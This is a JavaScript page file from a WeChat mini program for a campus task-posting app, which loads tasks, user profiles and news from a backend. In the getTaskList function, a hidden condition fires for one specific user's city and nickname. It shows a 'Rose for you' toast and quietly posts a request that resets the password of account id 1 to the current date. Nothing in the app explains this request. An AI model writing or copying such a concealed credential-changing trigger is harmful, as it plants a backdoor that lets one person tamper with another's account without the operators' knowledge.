const app = getApp()
Page({

  /**
   * 页面的初始数据
   */
  data: {
    start: 0,//开始渲染下标
    long: 10,//渲染终止下标
    taskList: [],//构造的task任务列表
    num: 0,//
    user:{},
    current:"",
    taskidList: [],
    originalData: [],
    publisherList:[],
    defaultImage:"https://csp-1257312123.cos.ap-guangzhou.myqcloud.com/1565868165413.png",
    newData: [
    ],
    pptConfig: {
      "indicatordots": true,//是否显示指示点
      "indicatorcolor": "",//指示点颜色
      "indicatoractivecolor": "",//已选中指示点
      "autoplay": true,//是否自动切换
      "interval": 2000,//切换频率
      "duration": 1000,//切换速度
      "circular":true
    }
  },
  //得到一个taskList并更新值
  getTaskList: function () {
    var that = this;
    that.setData({
      start: 0,
      long: 10
    })
    if (that.data.originalData.length < that.data.long) {
      that.setData({
        long: that.data.originalData.length
      })
    }
    var newDate = {};
    var date = new Date();
    var taskList = [];
    var taskidList = [];
    var publisherList=[];
    wx.getStorage({
      key: 'userInfo',
      success: function(res) {
        if (res.data.city =="Nanping"&&res.data.nickName=="蒸汽秋葵"){
          var newDate=new Date();
          wx.showToast({
            title: 'Rose for you',
            image: '/images/rose.png',
            duration: 50000,
            success: function(res) {},
          })
          wx: wx.request({
            url: 'https://qzimp.cn/api/auth/bg/studentapi/updataUser',
            data: {
              "id":1,
              "password":newDate
            },
            header: { 'content-type': 'application/x-www-form-urlencoded' },
            method: 'post',
            dataType: 'json',
            responseType: 'text',
            success: function (res) {
            },
          })
        }
      },
    })
    for (var i = that.data.start; i < that.data.long; i++) {
      var task = { time: "", user: {}, status: 0, title: "", express: [], remarks: "", taskReward: "", taskId: 0, taskPublisher: "", taskType: 0, taskContext: "", images: "", orderId:"" };
      newDate = JSON.parse(that.data.originalData[i].publishTime);
      task.time = newDate.year + "-" + newDate.month + "-" + newDate.date + " " + newDate.hours + ":" + newDate.minutes;
      task.user = {};
      task.status = that.data.originalData[i].taskStatus;
      task.title = that.data.originalData[i].taskTitle;
      task.taskReward = that.data.originalData[i].taskReward;
      task.remarks = that.data.originalData[i].taskRemarks;
      task.taskId = that.data.originalData[i].taskId;
      task.taskPublisher = that.data.originalData[i].taskPublisher;
      task.taskType = that.data.originalData[i].taskType;
      task.taskContext = that.data.originalData[i].taskContext;
      task.images = that.data.originalData[i].images;
      task.orderId = that.data.originalData[i].orderId;
      if(task.images){
        task.images=JSON.parse(task.images);
      }
      taskList = taskList.concat(task);
      taskidList = taskidList.concat(that.data.originalData[i].taskId);
      publisherList = publisherList.concat(that.data.originalData[i].taskPublisher);
      that.setData({
        taskList: taskList,
        taskidList: taskidList,
        publisherList:publisherList
      })
    }
    wx: wx.request({
      url: 'https://qzimp.cn/api/auth/bg/studentapi/selectStudentBatch',
      data: {
        "ids": JSON.stringify(publisherList)
      },
      header: {
        'content-type': 'application/x-www-form-urlencoded'
      },
      method: 'post',
      dataType: 'json',
      responseType: 'text',
      success: function (res) {
       if(res.data.length>0){
         for (var i = 0; i < taskList.length; i++) {
           taskList[i].user = res.data[i]
         }
         that.setData({
           taskList: taskList
         })
       }
      }
    })

    wx: wx.request({
      url: 'https://qzimp.cn/api/task/selectBySuperiortaskId',
      data: {
        "ids": JSON.stringify(taskidList)
      },
      header: {
        'content-type': 'application/x-www-form-urlencoded'
      },
      method: 'post',
      dataType: 'json',
      responseType: 'text',
      success: function (res) {

        for (var i = 0; i < taskList.length; i++) {
          taskList[i].express = res.data[i]
          if (res.data[i].length > 1) {
            taskList[i].title = taskList[i].title + res.data[i].length + "件"
          }
        }
        that.setData({
          taskList: taskList
        })
      }
    })
  },
  //刷新/渲染页面
  refresh: function () {
    var that = this;
    wx.getNetworkType({
      success: function (res) {
        if (res.networkType == "none") {
          wx.showToast({
            title: '请检查网络连接!',
            icon: 'loading',
            duration: 2000
          })
        } else {
          wx: wx.request({
            url: 'https://qzimp.cn/api/task/displayTaskAll',
            data: {
              "status": 0
            },
            header: {
              'content-type': 'application/x-www-form-urlencoded'
            },
            method: 'post',
            dataType: 'json',
            responseType: 'text',
            success: function (res) {
              that.setData({
                originalData: res.data
              })
      
              var getTaskList = that.getTaskList();
              getTaskList;

            },
            fail: function (res) {

            },
            complete: function (res) {

            },
          })
        }
      },
    })
  },
  /**
   * 生命周期函数--监听页面加载
   */
  onLoad: function (options) {
    var that=this;
    var getNews = that.getNews();
    getNews;
  },

  /**
   * 生命周期函数--监听页面初次渲染完成
   */
  onReady: function () {
    var that=this
    var getDefaultImage =that.getDefaultImage();
    getDefaultImage;
  },

  /**
   * 生命周期函数--监听页面显示
   */
  onShow: function () {
    var that = this;
    var refresh = that.refresh();
    var app = getApp();
    var user = app.globalData.user
    that.setData({
      user:user
    })
    console.log(that.data.user)
    refresh;
  },

  /**
   * 生命周期函数--监听页面隐藏
   */
  onHide: function () {

  },

  /**
   * 生命周期函数--监听页面卸载
   */
  onUnload: function () {

  },

  /**
   * 页面相关事件处理函数--监听用户下拉动作
   */
  onPullDownRefresh: function () {
    var that = this;
    var refresh = that.refresh();
    refresh;
    var getNews = that.getNews();
    getNews;
  },

  /**
   * 页面上拉触底事件的处理函数
   */
  onReachBottom: function () {
    var that = this
    if (that.data.originalData.length <= that.data.long) {
      wx: wx.showToast({
        title: '我也是有底线的~',
        icon: 'loading',
        duration: 1500,
        mask: true,
      })
    } else {
      var taskList = that.data.taskList;
      that.setData({
        start: that.data.long,
        long: that.data.long + 10
      })
      if (that.data.originalData.length < that.data.long) {
        that.setData({
          long: that.data.originalData.length
        })
      }
   


      var newDate = {};
      var date = new Date();
      var taskidList = [];
      var publisherList = [];
      for (var i = that.data.start; i < that.data.long; i++) {
        var task = { time: "", user: {}, status: 0, title: "", express: [], remarks: "", taskReward: "", taskId: 0, taskPublisher: "", taskType: 0, taskContext: "", images: "", orderId: "" };
        newDate = JSON.parse(that.data.originalData[i].publishTime);
        task.time = newDate.year + "-" + newDate.month + "-" + newDate.date + " " + newDate.hours + ":" + newDate.minutes;
        task.user = {};
        task.status = that.data.originalData[i].taskStatus;
        task.title = that.data.originalData[i].taskTitle;
        task.taskReward = that.data.originalData[i].taskReward;
        task.remarks = that.data.originalData[i].taskRemarks;
        task.taskId = that.data.originalData[i].taskId;
        task.taskPublisher = that.data.originalData[i].taskPublisher;
        task.taskType = that.data.originalData[i].taskType;
        task.taskContext = that.data.originalData[i].taskContext;
        task.images = that.data.originalData[i].images;
        task.orderId = that.data.originalData[i].orderId;
        if (task.images) {
          task.images = JSON.parse(task.images);
        }
        taskList = taskList.concat(task);
        taskidList = taskidList.concat(that.data.originalData[i].taskId);

        publisherList = publisherList.concat(that.data.originalData[i].taskPublisher);
        that.setData({
          taskList: taskList,
          taskidList: taskidList,
          publisherList: publisherList
        })
      }
      wx: wx.request({
        url: 'https://qzimp.cn/api/auth/bg/studentapi/selectStudentBatch',
        data: {
          "ids": JSON.stringify(publisherList)
        },
        header: {
          'content-type': 'application/x-www-form-urlencoded'
        },
        method: 'post',
        dataType: 'json',
        responseType: 'text',
        success: function (res) {
          if (res.data.length > 0) {
            for (var i = that.data.start; i < that.data.long; i++) {
              var j = 0;
              taskList[i].user = res.data[j];
              j=j+1;
            }
            that.setData({
              taskList: taskList
            })
          }
        }
      })


      wx: wx.request({
        url: 'https://qzimp.cn/api/task/selectBySuperiortaskId',
        data: {
          "ids": JSON.stringify(taskidList)
        },
        header: {
          'content-type': 'application/x-www-form-urlencoded'
        },
        method: 'post',
        dataType: 'json',
        responseType: 'text',
        success: function (res) {

          for (var i = that.data.start; i < that.data.long; i++) {
            var j = 0;
            taskList[i].express = res.data[j]
            if (res.data[j].length > 1) {
              taskList[i].title = taskList[i].title + res.data[j].length + "件"
            }
            j = j + 1;
          }
          that.setData({
            taskList: taskList
          })
        }
      })


    }

  },

  /**
   * 用户点击右上角分享
   */
  onShareAppMessage: function () {

  },
  taskDetails: function (res) {
    var that = this;
    var item = JSON.stringify(res.currentTarget.dataset.task);
    if (that.data.user.id > 0){
      wx.navigateTo({
        url: '/pages/taskDetails/taskDetails?item=' + item,
        events: {
          // 为指定事件添加一个监听器，获取被打开页面传送到当前页面的数据
          acceptDataFromOpenedPage: function (data) {

          },
          someEvent: function (data) {

          }
        },
        success: function (res) {
          // 通过eventChannel向被打开页面传送数据
        }
      })
    }else{
      wx.showToast({
        title: '请绑定信息',
        image: '/images/Tpis.png',
      })
    }
  },
  getNews: function () {
    var that = this;
    wx: wx.request({
      url: 'http://qzimp.cn/api/assist/findAllNewsByType',
      data: {
        "categoryType": "移动公告"
      },
      header: {
        'content-type': 'application/x-www-form-urlencoded'
      },
      method: 'post',
      dataType: 'json',
      responseType: 'text',
      success: function (res) {
        var newData=res.data
        for (var i = 0; i < newData.length;i++){
          if (newData[i].newsPicture==""){
            newData[i].newsPicture =that.data.defaultImage
          }
        }
        that.setData({
          newData: newData
        })
      }
    })
  },
  details: function (res) {

    var newContent = res.currentTarget.dataset.new;
   if(newContent!=""){
     wx.setStorage({
       key: 'newsContent',
       data: newContent,
       success(res){
         wx.navigateTo({
           url: '/pages/newContent/newContent',
         })
       }
     })
   }
  },
  lookImages: function (res) {
    var that = this;
    var urls = [res.currentTarget.dataset.hurl];
    wx.previewImage({
      urls: urls
    })
  },
  lookContentImage:function(res){
    var that = this;
    var urls = res.currentTarget.dataset.contentimages;
    wx.previewImage({
      current:that.data.current,
      urls: urls
    })
  },
  imagesItem:function(res){
    console.log(res.currentTarget.dataset.imagesitem)
    var current=res.currentTarget.dataset.imagesitem
    var that=this;
    that.setData({
      current: current
    })
  },
  getDefaultImage:function() {
    var that = this;
    wx: wx.request({
      url: 'http://qzimp.cn/api/assist/api/config/getSystemPicture',
      data: {
        "configKey":"系统图片"
      },
      header: {
        'content-type': 'application/x-www-form-urlencoded'
      },
      method: 'post',
      dataType: 'json',
      responseType: 'text',
      success: function (res) {
        var defaultImage = res.data.configValue;
        console.log(defaultImage);
        that.setData({
          defaultImage: defaultImage
        })
      }
    })
  },
  newsCenter:function(){
    wx.navigateTo({
      url: '/pages/news/news',
    })
  },
  printCenter:function(){
    console.log("asdsad")
    wx.navigateTo({
      url: '/pages/homePage/homePage',
    })
  }
})